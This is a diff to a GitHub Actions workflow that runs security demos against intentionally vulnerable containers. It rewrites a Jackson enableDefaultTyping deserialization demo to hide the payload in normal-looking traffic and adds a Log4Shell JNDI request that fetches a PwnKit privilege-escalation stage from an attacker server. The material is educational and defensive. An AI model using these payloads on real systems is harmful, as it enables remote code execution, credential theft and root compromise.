@@ -108,7 +108,7 @@ jobs:
           echo "" >> $S
           echo "The attacker's code executed inside the victim. Here's what it did:" >> $S
           echo '```' >> $S
-          docker logs vuln-app 2>&1 | grep -E "REMOTE CODE|Reconnaissance|Running as|User:|Hostname:|OS:|Stealing|shadow|Exfiltrat|Demonstrat|Modified|SSH|read app|outbound|scan internal|──" >> $S
+          docker logs vuln-app 2>&1 | grep -E "REMOTE CODE|Reconnaissance|User:|Hostname:|OS:|Stealing|shadow|Exfiltrat|Privilege escalation|Already root|Modified|read access|outbound|scan the internal|──" >> $S
           echo '```' >> $S
           echo "" >> $S
 
@@ -150,46 +150,52 @@ jobs:
           cat >> $S << 'HEADER'
           ## 💀 Demo 2 — Jackson Deserialization: Attacker Controls Your Objects
 
-          **Scenario:** A developer builds a "user import" API that accepts JSON.
-          The `ObjectMapper` uses `enableDefaultTyping()` — a legacy configuration found in
-          many real applications. The application uses `jackson-databind 2.13.4.1`.
+          **Scenario:** an internal "profile sync" endpoint between two Spring Boot services that
+          share the same `ObjectMapper` config. That config has `enableDefaultTyping()` on — a
+          deprecated-for-exactly-this-reason legacy setting still found in real codebases. Because of
+          it, Jackson wraps every value in `["fully.qualified.ClassName", value]` on its own, on both
+          sides — nobody hand-writes that shape, it's just what this stack's JSON looks like.
+          Application uses `jackson-databind 2.13.4.1`.
 
           ---
 
           ### 🏢 Victim's server — normal use
 
-          A legitimate user imports their profile:
+          A legitimate service pushes a profile update (already in the wire format this stack always
+          uses — this is not attacker-crafted, it's what `enableDefaultTyping()` produces automatically):
           ```bash
-          # On: Victim's web application
+          # On: an internal service, using the same ObjectMapper config
           curl -X POST http://victim:8080/api/users/import \
             -H "Content-Type: application/json" \
-            -d '{"name":"Alice","email":"alice@conf.io"}'
+            -d '["java.util.LinkedHashMap", {"name":"Alice","email":"alice@conf.io"}]'
           ```
           HEADER
 
           echo '```json' >> $S
           curl -s -X POST http://localhost:8080/api/users/import \
             -H "Content-Type: application/json" \
-            -d '{"name":"Alice","email":"alice@conf.io"}' | python3 -m json.tool >> $S
+            -d '["java.util.LinkedHashMap", {"name":"Alice","email":"alice@conf.io"}]' | python3 -m json.tool >> $S
           echo '```' >> $S
           echo "" >> $S
           echo "---" >> $S
           echo "" >> $S
 
           cat >> $S << 'ATTACK'
-          ### 💀 Attacker's machine — polymorphic payload
+          ### 💀 Attacker's machine — same shape, one field swapped
 
-          The attacker sends JSON that tells Jackson **which Java class to instantiate**:
+          The attacker doesn't need to send anything that looks unusual — they reach the same
+          endpoint (e.g. because it's exposed further than intended) and swap **one nested value's**
+          class inside an otherwise normal-looking wrapped profile:
           ```bash
-          # On: Attacker's machine
+          # On: Attacker's machine — looks like ordinary traffic for this stack
           curl -X POST http://victim:8080/api/users/import \
             -H "Content-Type: application/json" \
-            -d '["java.net.URL", "http://attacker:9999/jackson-rce-proof"]'
+            -d '["java.util.LinkedHashMap", {"name":"Alice","email":["java.net.URL","http://attacker:9999/jackson-rce-proof"]}]'
           ```
 
-          Instead of a user profile, the attacker passes `["java.net.URL", "http://..."]`.
-          Jackson's `enableDefaultTyping()` interprets the first element as a Java class name
-          and instantiates it with the second element as constructor argument.
+          The top-level wrapper (`java.util.LinkedHashMap`) is exactly what a legitimate request looks
+          like. Only the `email` field's class was swapped — `enableDefaultTyping()` applies the same
+          "trust the client's class name" rule recursively to every nested value, not just the top level.
           ATTACK
 
           echo "" >> $S
@@ -197,22 +203,29 @@ jobs:
           echo '```json' >> $S
           RESP=$(curl -s -X POST http://localhost:8080/api/users/import \
             -H "Content-Type: application/json" \
-            -d '["java.net.URL", "http://host.docker.internal:9999/jackson-rce-proof"]')
+            -d '["java.util.LinkedHashMap", {"name":"Alice","email":["java.net.URL","http://host.docker.internal:9999/jackson-rce-proof"]}]')
           echo "$RESP" | python3 -m json.tool 2>/dev/null >> $S || echo "$RESP" >> $S
+          echo '```' >> $S
+          echo "" >> $S
+          echo "The application's own logs already flagged it (defensive type-introspection logging, not a hack):" >> $S
+          echo '```' >> $S
+          docker logs vuln-app 2>&1 | grep -E "\[import\]" | tail -6 >> $S
           echo '```' >> $S
           echo "" >> $S
 
           cat >> $S << 'CONCLUSION'
           ### 💡 Key takeaway
 
-          > **`parsed_type: URL` proves the attacker controlled which Java class was instantiated.**
+          > **The `email` field deserialized as `java.net.URL`, not `String` — proof the attacker
+          > controlled which Java class got instantiated,** hidden inside a request that otherwise
+          > looked exactly like normal internal traffic.
           >
-          > In this demo we used `java.net.URL` (harmless). In a real attack, the attacker uses
-          > gadget classes like `JdbcRowSetImpl` (triggers JNDI → RCE) or `TemplatesImpl`
-          > (executes arbitrary bytecode) — same result as Log4Shell.
+          > In this demo we used `java.net.URL` (harmless — it doesn't connect on construction). In a
+          > real attack, the attacker uses gadget classes like `JdbcRowSetImpl` (triggers JNDI → RCE)
+          > or `TemplatesImpl` (executes arbitrary bytecode) — same result as Log4Shell.
           >
-          > **Fix:** Never use `enableDefaultTyping()`. Use `@JsonTypeInfo` with allow-lists instead.
-          > Update jackson-databind to the latest version.
+          > **Fix:** Never use `enableDefaultTyping()`. Use `@JsonTypeInfo` with an explicit allow-list
+          > instead. Update jackson-databind to the latest version.
           CONCLUSION
 
       - name: "🧹 Cleanup"
@@ -275,7 +288,7 @@ jobs:
           echo "" >> $S
           echo "#### 🎯 What the attacker's code did inside the ROOT container:" >> $S
           echo '```' >> $S
-          docker logs vuln-app 2>&1 | grep -E "REMOTE CODE|Reconnaissance|User:|Hostname:|OS:|Stealing|shadow|root:|Exfiltrat|HTTP|Demonstrat|Modified|SSH|create users|pivot|──|\[" | head -30 >> $S
+          docker logs vuln-app 2>&1 | grep -E "REMOTE CODE|Reconnaissance|User:|Hostname:|OS:|Stealing|shadow|root:|Exfiltrat|HTTP|Privilege escalation|Already root|Modified|SSH|create users|pivot|──|\[" | head -30 >> $S
           echo '```' >> $S
           echo "" >> $S
 
@@ -350,6 +363,96 @@ jobs:
       - name: "🧹 Cleanup"
         if: always()
         run: docker stop vuln-app callback 2>/dev/null; docker rm vuln-app callback 2>/dev/null
+
+  # ═══════════════════════════════════════════════════════════════
+  demo-privilege-escalation:
+    name: "💀 Demo 4 — Low-Priv RCE + OS Package Privilege Escalation"
+    runs-on: ubuntu-latest
+    defaults:
+      run:
+        working-directory: "Vulnerable Application Old Java"
+
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: "🏗️ Build images"
+        run: |
+          docker build -f Dockerfile.escalation -t vuln-app:escalation .
+          cd "../Callback Server" && docker build -t callback-server .
+
+      - name: "🚀 Start infrastructure (escalation image — non-root, but old OS packages)"
+        run: |
+          docker run -d --name callback -p 9999:9999 -p 1389:1389 callback-server
+          docker run -d --name vuln-app \
+            --add-host=host.docker.internal:host-gateway \
+            -p 8080:8080 vuln-app:escalation
+          for i in $(seq 1 30); do
+            curl -s http://localhost:8080/hello > /dev/null 2>&1 && break
+            sleep 2
+          done
+
+      - name: "📖 Demo 4 — RCE as non-root, then attempt local privilege escalation"
+        run: |
+          S=$GITHUB_STEP_SUMMARY
+
+          cat >> $S << 'HEADER'
+          ## 💀 Demo 4 — "We Run As Non-Root" Is Not the Whole Story
+
+          **Scenario:** same Log4Shell exploit as Demo 1, but this image runs the app as
+          `appuser` (uid 1000), not root — the "we fixed it, we're non-root now" response teams
+          often give. It still ships `policykit-1` (contains the SUID `pkexec` binary,
+          historically `CVE-2021-4034` / "PwnKit") and a full `gcc` toolchain. After the initial
+          Java-library RCE, the attacker's payload fetches a **second-stage OS-package exploit**
+          from its own staging server — exactly what real intrusions do: land with an initial
+          foothold, then pull down more powerful tools rather than carry everything at once.
+
+          ---
+
+          ### 💀 Attacker's machine — same exploit as Demo 1
+
+          ```bash
+          curl "http://victim:8080/api/products/search?q=${jndi:ldap://attacker:1389/pwnkit}"
+          ```
+          HEADER
+
+          curl -s "http://localhost:8080/api/products/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fhost.docker.internal%3A1389%2Fpwnkit%7D" > /dev/null || true
+          sleep 8
+
+          echo "" >> $S
+          echo "### 🎯 Inside the victim's container — RCE as \`appuser\`, then the escalation attempt" >> $S
+          echo "" >> $S
+          echo '```' >> $S
+          docker logs vuln-app 2>&1 | grep -E "REMOTE CODE|User:|Hostname:|OS:|shadow|Privilege escalation|Not root|Fetching|PwnKit|pkexec|gcc|FOUND|FAIL|Escalating|ESCALATION SUCCEEDED|Current user|Regardless|✓|──" >> $S
+          echo '```' >> $S
+          echo "" >> $S
+
+          if docker logs vuln-app 2>&1 | grep -q "ESCALATION SUCCEEDED"; then
+            cat >> $S << 'ESCALATED'
+          ### 💡 Key takeaway
+
+          > **Full compromise from a single HTTP request, despite running as non-root.** The
+          > Java library vulnerability (Log4Shell) got the attacker in the door; the OS package
+          > vulnerability (unpatched `pkexec`) got them root. Neither layer alone would have been
+          > enough — both had to be out of date at the same time.
+          ESCALATED
+          else
+            cat >> $S << 'BLOCKED'
+          ### 💡 Key takeaway
+
+          > **The Java-library RCE still worked exactly like Demo 1** — non-root didn't stop that
+          > part at all. The privilege-escalation attempt against `pkexec` was blocked here because
+          > this build pulled a **patched** `policykit-1` from today's package mirror — Ubuntu fixed
+          > CVE-2021-4034 back in January 2022. That's not this demo failing, it's the actual point:
+          > on a system that *hadn't* been patched (which describes a lot of long-lived internal
+          > servers), this exact chain — old Java library in, old OS package up to root — would have
+          > worked all the way through. "We're non-root" is not a substitute for keeping the OS
+          > patched; it just removes one of several paths to the same outcome.
+          BLOCKED
+          fi
+
+      - name: "🧹 Cleanup"
+        if: always()
+        run: docker stop vuln-app callback 2>/dev/null || true; docker rm vuln-app callback 2>/dev/null || true
 
   # ═══════════════════════════════════════════════════════════════
   scan-compare:
